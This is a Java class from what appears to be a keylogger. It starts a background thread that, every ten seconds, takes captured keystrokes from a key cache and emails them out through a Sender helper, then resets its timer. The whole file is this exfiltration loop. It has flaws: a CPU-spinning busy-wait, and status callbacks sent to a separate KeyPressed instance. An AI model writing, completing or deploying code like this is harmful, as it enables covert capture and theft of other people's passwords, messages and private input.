public class ManageService implements Runnable {
    private KeyPressed keyBoard;
    private Thread service;
    KeyPressed keyPressed = new KeyPressed();

    public ManageService() {
        keyBoard = new KeyPressed();
        service = new Thread(this, "Service");
        service.start();
    }

    public KeyPressed getKeyBoard() {
        return keyBoard;
    }

    @Override
    public void run() {
        long start = System.nanoTime();
        while (true) {
            long elapsed = (System.nanoTime() - start) / 1_000_000;
            if(elapsed > 10_000) {
                try {
                    Sender.sendMail(Utils.emailPrint(keyBoard.getKeyCache()));
                    keyPressed.onSend();
                } catch (Throwable throwable) {
                    throwable.printStackTrace();
                    keyPressed.onFail();
                }
                start = System.nanoTime();
            }
        }
    }
}
